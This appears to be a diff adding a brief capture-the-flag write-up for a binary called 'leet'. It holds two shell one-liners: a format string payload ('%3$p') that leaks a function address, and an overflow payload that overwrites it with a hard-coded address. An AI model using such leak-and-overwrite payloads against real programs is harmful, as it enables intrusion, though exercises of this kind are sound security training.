@@ -1,0 +1,5 @@
+Step 1: Reverse the provided binary and discover two flaws. A is replaced with 2 characters rather than 1. User input may be printed leading to a format string vulnerability.
+
+Step 2 (Identify where "useless_function"'s address is written): ./leet <<< $(python -c 'print(32*"A"+9*"B"+b"%3$p")')
+
+Step 3 (With the function address leaked, add offset necessary to get from "useless_function" to "main"): ./leet <<< $(python -c 'print(32*"A"+20*"B"+b"\x2d\x92\x04\x08")')
